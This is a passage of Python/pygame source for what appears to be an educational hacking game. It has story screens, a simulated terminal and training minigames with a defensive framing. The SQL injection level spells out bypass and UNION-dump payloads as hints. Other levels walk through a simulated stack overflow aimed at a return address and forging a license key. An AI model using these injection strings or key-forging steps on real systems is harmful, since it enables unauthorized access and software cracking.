            "sql range cleared. a hospital keeps its donor list another day.",
            "stack smashed: you aimed RET. then the canary won, as designed.",
            "crackme zero: you forged a key -- then patched the check. same crime.",
            "job 2: ransom defused. your old handle surfaced in the payload.",
            "hash alley: identical md5s = reused passwords. bcrypt said no.",
            "seal & sign: you hold a keypair now. encrypt-to-pub, sign-with-priv.",
            "job 3: blackbird plans stolen. ORION spoke on an open channel.",
            "root of all evil: three escalations, three config mistakes.",
            "their support portal fell: XSS cookie, alg:none JWT. we watch it now.",
            "rex mallow unmasked with zero exploits -- just his own posts.",
            "you survived orion's phone script. patch told you about the clinic.",
            "envelopes read: SPF/DKIM/DMARC -- origin is not trust.",
            "wire tapped (legally!): plaintext creds, ARP liars, TLS holding.",
            "the phonebook confessed: 'AIRGAP BREACH @ 0300'.",
            "metadata mirrored: you stole a cloud role with a URL. then fixed it.",
            "orion poisoned our build pipeline. you caught it. verify even us.",
            "castle wall held. wave three happened. we don't talk about it.",
            "storm shield: 3.2M req/s. the scrubbing bill came due.",
            "compartments drawn: printers and cameras live in quarantine.",
            "srv01 mapped, evicted. six words left behind.",
            "blackbird died in your yard. the vaccine ships under your signature."]
    def __init__(s,game): s.game=game
    def handle_event(s,e):
        if e.type==pygame.KEYDOWN and e.key in (pygame.K_ESCAPE,pygame.K_c): s.game.menu()
    def draw(s,sf):
        sf.fill(BG); y=22
        sf.blit(F_B.render("CAST & STORY SO FAR",True,GREEN),(60,y)); y+=40
        for name,col,lines in s.BIOS:
            sf.blit(F_M.render(name,True,col),(60,y)); y+=22
            for l in lines: sf.blit(F_S.render("   "+l,True,PALE),(60,y)); y+=18
            y+=3
        y+=2; sf.blit(F_S.render("-- PROGRESS --",True,CYAN),(60,y)); y+=19
        for i in range(sum(s.game.completed)):
            sf.blit(F_S.render("  * "+s.SO_FAR[i],True,YELLOW),(60,y)); y+=17
        if blink_on(): sf.blit(F_S.render("[C]/[ESC] back",True,GRAY),(60,H-32))
class CodexScreen(Screen):
    def __init__(s,game):
        s.game=game; s.tab=0; s.off=0
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key in (pygame.K_ESCAPE,pygame.K_k): s.game.menu()
        elif e.key==pygame.K_TAB: s.tab=1-s.tab; s.off=0
        elif s.tab==0:
            if e.key==pygame.K_DOWN: s.off=min(max(0,len(s.game.codex)-15),s.off+1)
            elif e.key==pygame.K_UP: s.off=max(0,s.off-1)
    def draw(s,sf):
        sf.fill(BG)
        g=s.game
        sf.blit(F_B.render("CODEX & COMMENDATIONS",True,GREEN),(60,28))
        sf.blit(F_S.render(f"[TAB] switch   ({'CODEX' if s.tab==0 else 'COMMENDATIONS'})   [K]/[ESC] back",True,GRAY),(60,70))
        if s.tab==0:
            terms=sorted(g.codex)
            if not terms:
                sf.blit(F_S.render("empty -- terms unlock as you play. endless depths unlock randoms too.",True,GRAY),(80,110))
            sf.blit(F_S.render(f"{len(terms)}/{len(CODEX)} terms discovered",True,YELLOW),(W-320,74))
            y=100
            for t in terms[s.off:s.off+15]:
                sf.blit(F_M.render(t,True,CYAN),(80,y))
                draw_lines(sf,wrap(CODEX[t],F_S,W-220),F_S,PALE,100,y+24,18)
                y+=24+len(wrap(CODEX[t],F_S,W-220))*18+8
            if len(terms)>15:
                sf.blit(F_S.render("UP/DOWN scroll",True,GRAY),(80,H-36))
        else:
            y=96
            for key,(name,desc) in ACH.items():
                got=key in g.ach
                col=YELLOW if got else (60,70,60)
                sf.blit(F_M.render(("* " if got else "  ")+name,True,col),(80,y))
                sf.blit(F_S.render(desc,True,PALE if got else GRAY),(380,y+2))
                y+=32
            sf.blit(F_S.render(f"{len(g.ach)}/{len(ACH)} earned",True,YELLOW),(80,y+8))
class BriefingScreen(Screen):
    def __init__(s,game,idx):
        s.game,s.idx=game,idx
        s.title,body=BRIEFS[idx]; s.typer=Typer(body,120)
    def update(s,dt): s.typer.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if not s.typer.done: s.typer.skip()
        elif e.key in (pygame.K_RETURN,pygame.K_SPACE): s.game.launch_job(s.idx)
    def draw(s,sf):
        sf.fill(BG)
        sf.blit(F_S.render(">> INCOMING MISSION FILE :: ENCRYPTED <<",True,CYAN),(60,40))
        sf.blit(F_B.render(s.title,True,GREEN),(60,68))
        pygame.draw.line(sf,MDIM,(60,112),(W-60,112),2)
        draw_lines(sf,wrap(s.typer.shown,F_M,W-160),F_M,PALE,78,136,27)
        if s.typer.done and blink_on(): sf.blit(F_M.render("[ENTER] begin",True,YELLOW),(80,H-60))
class DebriefScreen(Screen):
    def __init__(s,game,idx,earned,passed):
        s.game,s.idx,s.earned,s.passed=game,idx,earned,passed
        s.typer=Typer("\n".join(DEBRIEFS[idx]),160)
    def update(s,dt): s.typer.update(dt)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if not s.typer.done: s.typer.skip()
        elif e.key in (pygame.K_RETURN,pygame.K_SPACE): s.game.after_debrief(s.idx,s.passed)
        elif e.key==pygame.K_r and not s.passed: s.game.launch_job(s.idx)
    def draw(s,sf):
        sf.fill(BG)
        top="MISSION COMPLETE" if s.passed else "DEBRIEF :: NOT PASSED"
        sf.blit(F_B.render(top,True,GREEN if s.passed else YELLOW),(60,36))
        sf.blit(F_M.render(f"+{s.earned} pts    TOTAL {s.game.score}",True,YELLOW),(60,78))
        pygame.draw.line(sf,MDIM,(60,112),(W-60,112),2)
        draw_lines(sf,wrap(s.typer.shown,F_S,W-150),F_S,PALE,70,132,21)
        if s.typer.done and blink_on():
            if s.passed: sf.blit(F_M.render("[ENTER] continue",True,GREEN),(W-250,H-50))
            else: sf.blit(F_M.render("[R] retry   [ENTER] menu",True,YELLOW),(W-300,H-50))
class FinalScreen(Screen):
    def __init__(s,game):
        s.game=game; s.rain=MatrixRain(W,H); sc=game.score
        if sc>=3800: s.rank,note="ELITE WHITE HAT","Companies pay serious money for these instincts."
        elif sc>=2900: s.rank,note="SECURITY ANALYST","Strong tradecraft on BOTH sides of the wire."
        elif sc>=1800: s.rank,note="JUNIOR PENTESTER","Solid. Replay for cleaner runs."
        else: s.rank,note="SCRIPT KIDDIE","Everyone starts somewhere. Run it back."
        s.note=note; game.high=max(game.high,sc); game.save()
    def update(s,dt): s.rain.update(dt)
    def handle_event(s,e):
        if e.type==pygame.KEYDOWN and e.key==pygame.K_RETURN: s.game.score=0; s.game.story_menu()
    def draw(s,sf):
        s.rain.draw(sf)
        ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,150)); sf.blit(ov,(0,0))
        sf.blit(F_M.render("CAMPAIGN COMPLETE :: CERTIFICATION ISSUED",True,CYAN),(60,60))
        r=F_H.render(s.rank,True,GREEN); sf.blit(r,(W//2-r.get_width()//2,130))
        sf.blit(F_M.render(s.note,True,PALE),(W//2-F_M.size(s.note)[0]//2,200))
        sf.blit(F_B.render(f"SCORE {s.game.score:04d}   BEST {s.game.high:04d}   CAREER XP {s.game.xp}",
                           True,YELLOW),(W//2-260,250))
        pygame.draw.line(sf,MDIM,(150,310),(W-150,310),2)
        recap=["The vaccine ships under your signature. The bottle went",
               "back in the water -- on purpose, this time.","",
               "Doors two and three: ENDLESS MODE keeps generating nets.",
               "Sandbox stays free. The codex keeps filling."]
        draw_lines(sf,recap,F_M,PALE,250,340,28)
        if blink_on(): sf.blit(F_M.render("[ENTER] story menu",True,GREEN),(W//2-140,H-70))

# =============================================================
#  TERMINAL (story / endless / sandbox) + hijack
# =============================================================
class TerminalScreen(Screen):
    def __init__(s,game,mode,job,m_idx=None,depth=1):
        s.game,s.mode,s.job,s.depth=game,mode,job,depth
        s.m_idx=m_idx
        s.nsh=NSH(job,game); s.start_score=game.score
        s.hist,s.input_str=[],""
        s.cmd_hist,s.ch_i=[],0
        s.queue,s.map_full,s.done,s.hijack=[],False,False,False
        s.max_trace=0.0; s.bd=None
        for t,c in [("NSH v1.8 -- Node SHell",CYAN),
                    ("right panel: OBJECTIVES + NETMAP.  TAB = fullscreen map.  ESC = pause.",GRAY),
                    ("type 'help' for commands, 'scan' to map the network.",PALE)]:
            s.queue.append([0.15,t,c,None])
        if mode=="endless":
            s.queue.append([0.2,f"ENDLESS DEPTH {depth} -- trace x{job['trace_mult']:.2f}. salvage pays. noise costs.",ORANGE,None])
        elif mode=="sandbox":
            s.queue.append([0.2,"SANDBOX MODE -- nothing counts. experiment. break things.",ORANGE,None])
    def prompt(s):
        loc=s.nsh.nodes[s.nsh.session]["alias"] if s.nsh.session else "~"
        return f"whitehat@nsh:{loc}$ "
    def emit(s,t,c,sn=None):
        if t=="__CLEAR__": s.hist.clear(); return
        s.hist.append((t,c))
        if len(s.hist)>400: del s.hist[:100]
        if sn: sfx(sn)
    def compute_endless(s):
        n=s.nsh
        obj_pts=150*len(n.obj_done)
        trace_bonus=60 if s.max_trace<=40 else 30 if s.max_trace<=70 else 0
        comp=100+10*s.depth
        total=obj_pts+n.salvage_pts+n.intel_pts+trace_bonus+comp
        s.bd=[("objectives",obj_pts),("salvage",n.salvage_pts),("intel",n.intel_pts),
              ("trace bonus",trace_bonus),("depth bonus",comp)]
        return total
    def update(s,dt):
        s.nsh.trace=max(0.0,s.nsh.trace-2.0*dt)
        s.max_trace=max(s.max_trace,s.nsh.trace)
        if s.queue:
            s.queue[0][0]-=dt
            if s.queue[0][0]<=0:
                _t,t,c,sn=s.queue.pop(0); s.emit(t,c,sn)
        if s.nsh.want_map: s.nsh.want_map=False; s.map_full=not s.map_full
        if s.nsh.finished and not s.done and not s.queue:
            if s.mode=="story" and s.m_idx==7 and not s.hijack:
                s.hijack=True
                for d,t,c in HIJACK: s.queue.append([d,t,c,None])
                return
            s.done=True
            if s.max_trace<=60: s.game.achieve("ghost")
            msg=("CONTRACT COMPLETE -- [ENTER] file the job" if s.mode=="endless"
                 else "ALL OBJECTIVES COMPLETE -- clean extraction. [ENTER] for debrief")
            s.emit(msg,ORANGE,"win")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if e.key==pygame.K_TAB: s.map_full=not s.map_full; return
        if s.done:
            if e.key in (pygame.K_RETURN,pygame.K_SPACE):
                if s.mode=="story":
                    s.game.finish_job(s.m_idx,(s.game.score-s.start_score)+200,True)
                elif s.mode=="endless":
                    total=s.compute_endless()
                    s.game.finish_endless(s.depth,total,s.bd,s.max_trace,s.nsh)
                else:
                    s.game.menu()
            return
        if e.key==pygame.K_RETURN:
            cmd=s.input_str; s.emit(s.prompt()+cmd,GREEN); s.input_str=""
            if cmd.strip(): s.cmd_hist.append(cmd)
            s.ch_i=len(s.cmd_hist)
            for ev in s.nsh.execute(cmd): s.queue.append(list(ev))
        elif e.key==pygame.K_BACKSPACE: s.input_str=s.input_str[:-1]; sfx("key")
        elif e.key==pygame.K_UP:
            if s.cmd_hist: s.ch_i=max(0,s.ch_i-1); s.input_str=s.cmd_hist[s.ch_i]
        elif e.key==pygame.K_DOWN:
            s.ch_i=min(len(s.cmd_hist),s.ch_i+1)
            s.input_str=s.cmd_hist[s.ch_i] if s.ch_i<len(s.cmd_hist) else ""
        else:
            if e.unicode and ord(e.unicode)>=32 and len(s.input_str)<60:
                s.input_str+=e.unicode; sfx("key")
    def draw(s,sf):
        sf.fill(BG); header(sf,s.job["title"],s.game.score,s.nsh.trace)
        pr=s.prompt(); prw=F_S.size(pr)[0]; lh=21
        show=s.hist[-((H-34-66)//lh):]; y=H-34-len(show)*lh
        for t,c in show: sf.blit(F_S.render(t,True,c),(16,y)); y+=lh
        sf.blit(F_S.render(pr,True,MDIM),(16,H-30))
        sf.blit(F_S.render(s.input_str,True,GREEN),(16+prw,H-30))
        if blink_on(350) and not s.done:
            pygame.draw.rect(sf,GREEN,(16+prw+F_S.size(s.input_str)[0],H-30,9,17))
        px,pw=652,356
        nobj=max(1,len(s.job["objectives"])); obh=46+nobj*42
        pygame.draw.rect(sf,(10,24,13),(px,62,pw,obh)); pygame.draw.rect(sf,MDIM,(px,62,pw,obh),2)
        sf.blit(F_S.render("OBJECTIVES -- WHAT TO RETRIEVE" if s.job["objectives"]
                           else "SANDBOX -- no objectives, just practice",True,CYAN),(px+12,70))
        yy=96
        for ip,fn in s.job["objectives"]:
            nd=s.nsh.nodes[ip]; done=(ip,fn) in s.nsh.obj_done
            col=GREEN if done else YELLOW
            diamond(sf,px+24,yy+9,6,col)
            sf.blit(F_S.render(fn,True,col),(px+40,yy))
            sf.blit(F_T.render(f"from {nd['alias']} ({ip})"+("   [DONE]" if done else ""),
                     True,GREEN if done else GRAY),(px+40,yy+19))
            yy+=42
        mby=62+obh+10; mbh=H-24-mby
        pygame.draw.rect(sf,(10,24,13),(px,mby,pw,mbh)); pygame.draw.rect(sf,MDIM,(px,mby,pw,mbh),2)
        sf.blit(F_S.render("NETMAP -- NODES TO HACK",True,CYAN),(px+12,mby+6))
        draw_netmap(sf,s.nsh,(px+4,mby+26,pw-8,mbh-32))
        if s.map_full:
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,200)); sf.blit(ov,(0,0))
            sf.blit(F_B.render("NETMAP :: "+s.job["title"][:40],True,GREEN),(60,56))
            area=(80,120,W-160,H-220)
            for ip,nd in s.nsh.nodes.items():
                if ip not in s.nsh.known: continue
                for link in nd["links"]:
                    if link in s.nsh.known and ip<link:
                        a,b=nd["pos"],s.nsh.nodes[link]["pos"]
                        pygame.draw.line(sf,DDIM,(area[0]+42+a[0]*(area[2]-84),area[1]+20+a[1]*(area[3]-40)),
                                         (area[0]+42+b[0]*(area[2]-84),area[1]+20+b[1]*(area[3]-40)),2)
            for ip,nd in sorted(s.nsh.nodes.items()):
                cx=area[0]+42+nd["pos"][0]*(area[2]-84); cy=area[1]+20+nd["pos"][1]*(area[3]-40)
                st="hidden"
                if ip in s.nsh.known:
                    st="owned" if ip in s.nsh.owned else "probed" if ip in s.nsh.probed else "known"
                draw_chip(sf,nd["alias"],st,ip in {i for i,_ in s.job["objectives"]},
                          ip==s.nsh.session,cx,cy,w=150,h=30)
                if ip not in s.nsh.known: continue
                if ip in s.nsh.probed:
                    locks=[]
                    if nd.get("password"): locks.append("PW")
                    if nd.get("blocks") and not s.nsh.firewall_down: locks.append("FW")
                    if any(f.get("enc") for f in nd["files"]): locks.append("ENC")
                    if nd.get("vulns"): locks.append(f"{len(nd['vulns'])} CVE")
                    sf.blit(F_T.render(f"{ip} [{KIND_CODE[nd['kind']]}] {' '.join(locks)}",True,GRAY),(cx-70,cy+34))
                else: sf.blit(F_T.render(ip+"  (run 'probe')",True,GRAY),(cx-70,cy+34))
                for j,(oip,ofn) in enumerate([o for o in s.job["objectives"] if o[0]==ip]):
                    col=GREEN if (ip,ofn) in s.nsh.obj_done else YELLOW
                    sf.blit(F_T.render(f"retrieve: {ofn}",True,col),(cx-70,cy+50+j*15))
            sf.blit(F_S.render("TAB: close map",True,CYAN),(W//2-60,H-44))

# =============================================================
#  STORY MINIGAMES (unchanged mechanics)
# =============================================================
SQL_LEVELS=[
 dict(name="LEVEL 1/3 :: THE CLASSIC BYPASS",
      tpl="SELECT * FROM users WHERE user='{u}' AND pass='{p}'",
      goal="Log in as admin WITHOUT the password. PASSWORD box:\nclose the string, force the WHERE to be always true.",
      hint="Try:   ' OR '1'='1",resp=["1 row returned.  welcome, admin.","you are now 'authenticated'."],
      check=lambda u,p: p.strip().startswith("'") and re.search(r"or",p,re.I) and "=" in p),
 dict(name="LEVEL 2/3 :: COMMENT DROP",
      tpl="SELECT * FROM users WHERE user='{u}' AND pass='{p}'",
      goal="Use a SQL COMMENT in the USERNAME box so the password\nclause is never evaluated. Log in as admin.",
      hint="Try:   admin' --",resp=["1 row returned.  welcome, admin.","(the password check? commented out. gone.)"],
      check=lambda u,p: "admin" in u.lower() and "--" in u),
 dict(name="LEVEL 3/3 :: UNION DATA DUMP",
      tpl="SELECT name, pass FROM users WHERE user='{u}'",
      goal="Craft a UNION SELECT in the USERNAME box that appends\nthe secrets flag. Comment out anything after.",
      hint="Try:   x' UNION SELECT val FROM secrets --",
      resp=["row: FLAG{p_r3p4r3d_5t4t3m3nt5}","(that flag IS the fix. debrief incoming.)"],
      check=lambda u,p:(lambda s_: all(w in s_ for w in ("union","select","secrets")) and "--" in s_)((u+" "+p).lower())),
]
class MissionSQL(Mission):
    def __init__(s,game):
        s.game=game; s.lvl,s.fields,s.focus=0,["",""],0
        s.msg=SQL_LEVELS[0]["goal"].split("\n")[0]
        s.resp,s.ok_state,s.fails,s.hint=[],False,0,False
        s.finished,s.passed,s.earned=False,False,0
    def segments(s):
        tpl=SQL_LEVELS[s.lvl]["tpl"]; u,p=s.fields
        segs=[]; buf=""; i=0
        while i<len(tpl):
            if tpl.startswith("{u}",i):
                if buf: segs.append((buf,PALE)); buf=""
                segs.append((u or "...",RED)); i+=3
            elif tpl.startswith("{p}",i):
                if buf: segs.append((buf,PALE)); buf=""
                segs.append((p or "...",RED)); i+=3
            else: buf+=tpl[i]; i+=1
        if buf: segs.append((buf,PALE))
        return segs
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.ok_state:
            if e.key in (pygame.K_SPACE,pygame.K_RETURN):
                s.lvl+=1
                if s.lvl>=len(SQL_LEVELS):
                    s.passed,s.finished=True,True
                    if not s.hint: s.game.achieve("purist")
                    s.game.achieve("first_blood")
                else:
                    s.fields,s.focus=["",""],0
                    s.resp,s.ok_state,s.fails,s.hint=[],False,0,False
                    s.msg=SQL_LEVELS[s.lvl]["goal"].split("\n")[0]
            return
        L=SQL_LEVELS[s.lvl]
        if e.key==pygame.K_TAB: s.focus=1-s.focus
        elif e.key==pygame.K_h: s.hint=True; s.msg="HINT: "+L["hint"]; sfx("tick")
        elif e.key==pygame.K_RETURN:
            u,p=s.fields
            if L["check"](u,p):
                s.ok_state=True; s.resp=L["resp"]; sfx("win"); s.earned+=25 if s.hint else 50
            else:
                s.fails+=1; sfx("bad")
                s.msg="0 rows returned."+(("   press H for a hint.") if s.fails>=2 else "  try again.")
        elif e.key==pygame.K_BACKSPACE: s.fields[s.focus]=s.fields[s.focus][:-1]; sfx("key")
        elif e.unicode and ord(e.unicode)>=32 and len(s.fields[s.focus])<34:
            s.fields[s.focus]+=e.unicode; sfx("key")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: SQL INJECTION",s.game.score)
        L=SQL_LEVELS[s.lvl]
        sf.blit(F_B.render(L["name"],True,GREEN),(60,66))
        draw_lines(sf,wrap("GOAL: "+L["goal"],F_S,W-140),F_S,YELLOW,60,110,21)
        qbox=pygame.Rect(60,180,W-120,44)
        pygame.draw.rect(sf,(10,24,13),qbox); pygame.draw.rect(sf,MDIM,qbox,2)
        x=qbox.x+10
        for txt,col in s.segments():
            r=F_S.render(txt,True,col); sf.blit(r,(x,qbox.y+12)); x+=r.get_width()
            if x>qbox.right-10: break
        sf.blit(F_T.render("live query -- red = YOUR input becoming CODE",True,GRAY),(60,228))
        for i,(lab,val) in enumerate(zip(("USER","PASS"),s.fields)):
            y=266+i*46
            sf.blit(F_M.render(lab,True,CYAN),(60,y))
            r=pygame.Rect(140,y-4,W-260,36)
            pygame.draw.rect(sf,(10,24,13),r)
            pygame.draw.rect(sf,YELLOW if s.focus==i else MDIM,r,2)
            sf.blit(F_M.render(val,True,RED),(r.x+8,r.y+6))
            if s.focus==i and blink_on(350):
                pygame.draw.rect(sf,RED,(r.x+10+F_S.size(val)[0],r.y+6,9,22))
        sf.blit(F_S.render("TAB switch   ENTER submit   H hint",True,GRAY),(60,366))
        ry=406
        sf.blit(F_S.render("DB RESPONSE:",True,CYAN),(60,ry)); ry+=24
        for ln in s.resp: sf.blit(F_M.render(ln,True,GREEN),(70,ry)); ry+=26
        if not s.ok_state: sf.blit(F_S.render(s.msg,True,YELLOW),(60,H-56))
        else: sf.blit(F_M.render("BYPASS CONFIRMED!  [SPACE] next level",True,GREEN),(60,H-56))

class MissionStack(Mission):
    BUF=16
    ROUNDS=[
     dict(name="ROUND 1/3 :: THE CLASSIC",canary=False,aslr=False,
          goal="secret_win() sits at 0x00401337 and is never called. Overflow past\nRET and point it there. (buffer 16 | canary 4 | EBP 4 | RET 4)"),
     dict(name="ROUND 2/3 :: ASLR",canary=False,aslr=True,
          goal="ASLR: addresses shuffle EVERY attempt. READ THE LEAK, then aim."),
     dict(name="ROUND 3/3 :: THE CANARY",canary=True,aslr=True,
          goal="A random canary guards the road to RET. Try to beat it.\n(You can't. Win by losing correctly.)")]
    def __init__(s,game):
        s.game=game; s.ri=0; s.shells=0
        s.fields=["25","0x00401337"]; s.focus=0
        s.phase="input"; s.queue=[]; s.fill=None; s.res=None
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"PATCH","The oldest trick in the book. Time you saw it up close.")
        s.start_round()
    def start_round(s):
        cfg=s.ROUNDS[s.ri]
        s.win=(0x00400000+random.randrange(0,0xFFFF)*4) if cfg["aslr"] else 0x00401337
        s.canary=random.getrandbits(32)
        s.fields=["25",f"0x{s.win:08x}"] if cfg["aslr"] else ["25","0x00401337"]
        s.msg=cfg["goal"]; s.phase="input"; s.fill=None; s.res=None; s.queue=[]
    def run(s):
        try: n=int(s.fields[0].strip())
        except Exception: s.msg="LEN must be a number."; sfx("bad"); return
        try: addr=int(s.fields[1].strip().lower().replace("0x",""),16)
        except Exception: s.msg="ADDR must be hex, e.g. 0x00401337"; sfx("bad"); return
        s.queue=[]; steps=[]
        for i in range(min(n,s.BUF)): steps.append([0.045,("buf",)])
        if n>s.BUF: steps.append([0.30,("canary",)])
        if n>s.BUF+4: steps.append([0.25,("ebp",)])
        if n>s.BUF+8: steps.append([0.30,("ret",addr)])
        steps.append([0.35,("verdict",)])
        s.queue=steps; s.phase="anim"
        s.fill=dict(buf=0,canary=False,ebp=False,ret=None)
    def verdict(s):
        f=s.fill; cfg=s.ROUNDS[s.ri]
        if cfg["canary"]:
            if f["canary"]:
                s.res=("defended",f"*** stack smashing detected *** canary 0x{s.canary:08x} tripped -- ABORTED")
                s.msg="the canary died so the return address could live. THAT is the defense."
                s.game.achieve("bass")
            else:
                s.res=("harmless","payload fit in the buffer. the program yawns.")
            s.phase="result"; sfx("bad" if f["canary"] else "tick"); return
        if f["ret"] is not None:
            if f["ret"]==s.win:
                s.res=("shell",f"RET := 0x{f['ret']:08x} == secret_win()  ... SHELL OBTAINED")
                s.msg="you didn't break the lock. you redirected the program's own 'what next?'."
                s.shells+=1; sfx("win")
            else:
                s.res=("crash",f"RET := 0x{f['ret']:08x} -> SEGFAULT (that address isn't code)")
                sfx("bad")
        elif f["ebp"]:
            s.res=("crash","saved EBP smashed, return intact -- crashes later, uglier. aim for RET.")
            sfx("bad")
        else:
            s.res=("harmless","payload fit in the buffer. nothing happened.")
            sfx("tick")
        s.phase="result"
    def update(s,dt):
        s.radio.update(dt)
        if s.phase!="anim" or not s.queue: return
        s.queue[0][0]-=dt
        if s.queue[0][0]>0: return
        ev=s.queue.pop(0)[1]
        if ev[0]=="buf": s.fill["buf"]+=1; sfx("tick")
        elif ev[0]=="canary": s.fill["canary"]=True; sfx("bad")
        elif ev[0]=="ebp": s.fill["ebp"]=True
        elif ev[0]=="ret": s.fill["ret"]=ev[1]
        elif ev[0]=="verdict": s.verdict()
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="input":
            if e.key==pygame.K_TAB: s.focus=1-s.focus
            elif e.key==pygame.K_RETURN: s.run()
            elif e.key==pygame.K_BACKSPACE: s.fields[s.focus]=s.fields[s.focus][:-1]; sfx("key")
            elif e.unicode and ord(e.unicode)>=32 and len(s.fields[s.focus])<16:
                s.fields[s.focus]+=e.unicode; sfx("key")
        elif s.phase=="result" and e.key in (pygame.K_SPACE,pygame.K_RETURN):
            if s.ri>=2 or s.res[0] in ("shell","defended"):
                s.ri+=1
                if s.ri>=3:
                    s.earned=40*s.shells+60; s.passed=True; s.finished=True
                    s.game.achieve("first_blood"); return
                s.start_round()
            else:
                if s.ROUNDS[s.ri]["aslr"]: s.start_round()
                else: s.phase="input"
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: STACK SMASHER",s.game.score)
        cfg=s.ROUNDS[s.ri]
        sf.blit(F_B.render(cfg["name"],True,GREEN),(60,62))
        sx,sy=110,110
        pygame.draw.rect(sf,(9,20,11),(sx-24,sy-8,270,H-230))
        pygame.draw.rect(sf,MDIM,(sx-24,sy-8,270,H-230),2)
        base=0xbffff000
        rows=[]
        for i in range(s.BUF): rows.append((f"buffer[{i:02d}]",base+i*4,"buf",i))
        rows.append(("[CANARY]",base+s.BUF*4,"can",0))
        rows.append(("saved EBP",base+(s.BUF+4)*4,"ebp",0))
        rows.append(("RETURN ADDR",base+(s.BUF+8)*4,"ret",0))
        y=sy
        for label,addr,kind,idx in rows:
            val="."
            if kind=="buf": val="A" if (s.fill and idx<s.fill["buf"]) else "."
            elif kind=="can": val="BBBB" if (s.fill and s.fill["canary"]) else f"{s.canary:08x}"
            elif kind=="ebp": val="BBBB" if (s.fill and s.fill["ebp"]) else f"{base:08x}"
            elif kind=="ret": val=f"0x{s.fill['ret']:08x}" if (s.fill and s.fill["ret"] is not None) else "main+42"
            col=PALE
            if kind in ("buf","can","ebp") and val=="BBBB" or (kind=="buf" and val=="A"): col=RED
            if kind=="ret" and s.fill and s.fill["ret"] is not None: col=ORANGE
            sf.blit(F_T.render(f"0x{addr:08x}  {label:<12} | {val}",True,col),(sx-16,y)); y+=22
        sf.blit(F_T.render("low addresses (grows up = toward RET)",True,GRAY),(sx-16,y+4))
        px=430
        pygame.draw.rect(sf,(10,24,13),(px,100,530,180))
        pygame.draw.rect(sf,MDIM,(px,100,530,180),2)
        sf.blit(F_S.render("BINARY MAP",True,CYAN),(px+12,108))
        sf.blit(F_S.render("0x00401100  main      0x00401200  helper",True,PALE),(px+16,132))
        leak=f"leak: secret_win() @ 0x{s.win:08x}" if cfg["aslr"] else "secret_win() @ 0x00401337  (never called)"
        sf.blit(F_S.render(leak,True,YELLOW if cfg["aslr"] else DIMRED),(px+16,172))
        sf.blit(F_S.render(f"canary: {'ACTIVE' if cfg['canary'] else 'disabled'}    "
                           f"ASLR: {'ON' if cfg['aslr'] else 'off'}",True,CYAN),(px+16,192))
        sf.blit(F_S.render("secret_win(): grants shell. RET decides what runs next.",True,GRAY),(px+16,218))
        draw_lines(sf,wrap(s.msg,F_S,520),F_S,YELLOW,px,240,18)
        for i,(lab,val) in enumerate(zip(("LEN (bytes)","RET VALUE"),s.fields)):
            y2=430+i*44
            sf.blit(F_M.render(lab,True,CYAN),(px,y2))
            r=pygame.Rect(px+180,y2-4,180,34)
            pygame.draw.rect(sf,(10,24,13),r)
            pygame.draw.rect(sf,YELLOW if s.focus==i else MDIM,r,2)
            sf.blit(F_M.render(val,True,GREEN),(r.x+8,r.y+5))
        if s.phase=="input":
            sf.blit(F_S.render("TAB switch   ENTER fire payload",True,GRAY),(px,528))
        elif s.res:
            col={"shell":GREEN,"crash":RED,"harmless":GRAY,"defended":CYAN}[s.res[0]]
            draw_lines(sf,wrap(s.res[1],F_T,510),F_T,col,px,524,17)
        if s.phase=="result" and blink_on():
            sf.blit(F_S.render("[SPACE] continue",True,YELLOW),(px,566))
        s.radio.draw(sf,H-58)

CRACKME_CODE=["/* crackme.elf -- license validator (V0IDRAT build tools) */",
 "int validate(const char *key) {",
 "    int sum = 0;",
 "    for (int i=0; key[i]; i++) sum += key[i];   // ASCII checksum",
 "    if (strlen(key) != 10)              return 0;   // rule 1",
 "    if (key[0]!='L' || key[1]!='Z')     return 0;   // rule 2",
 "    if (key[2]!='-' || key[5]!='-')     return 0;   // rule 3",
 "    if ((key[3]-'0')+(key[4]-'0')!=12)  return 0;   // rule 4",
 "    if (sum != 700)                     return 0;   // rule 5",
 "    for (int i=6;i<10;i++)",
 "        if (key[i]<'A'||key[i]>'Z')     return 0;   // rule 6",
 "    return 1;                                 // 0x00401337 never called",
 "}"]
class MissionCrackme(Mission):
    RULES=[("R1 len==10",lambda k: len(k)==10),
     ("R2 prefix 'LZ'",lambda k: len(k)>=2 and k[:2]=="LZ"),
     ("R3 dashes @2,5",lambda k: len(k)>5 and k[2]=='-' and k[5]=='-'),
     ("R4 digits@3,4 sum 12",lambda k: len(k)>4 and k[3].isdigit() and k[4].isdigit() and int(k[3])+int(k[4])==12),
     ("R5 ASCII sum == 700",lambda k: len(k)>0 and sum(map(ord,k))==700),
     ("R6 tail[6:] = A-Z",lambda k: len(k)==10 and all('A'<=c<='Z' for c in k[6:]))]
    def __init__(s,game):
        s.game=game; s.key=""; s.phase="crack"
        s.patched=False; s.cracked=False
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","six rules, one key. it's a crossword for robots.")
        s.radio.say(6.0,"PATCH","Math hint: '4'+'8' and '3'+'9' sum the SAME ascii. the space is bigger than you think.")
    def all_pass(s): return all(f(s.key) for _l,f in s.RULES)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="crack":
            if e.key==pygame.K_RETURN:
                if s.all_pass():
                    s.cracked=True; s.phase="patch"; sfx("win")
                    s.radio.say(0,"KIP","KEY ACCEPTED. keygen city, population: us.")
                else: sfx("bad")
            elif e.key==pygame.K_BACKSPACE: s.key=s.key[:-1]; sfx("key")
            elif e.unicode and (ord(e.unicode)>=32) and len(s.key)<10: s.key+=e.unicode; sfx("key")
        elif s.phase=="patch":
            if e.key==pygame.K_p:
                s.patched=True; sfx("win"); s.earned=60+(30 if not s.cracked else 0)
                s.passed=True; s.phase="done"
            elif e.key in (pygame.K_RETURN,pygame.K_SPACE):
                s.earned=80; s.passed=True; s.phase="done"
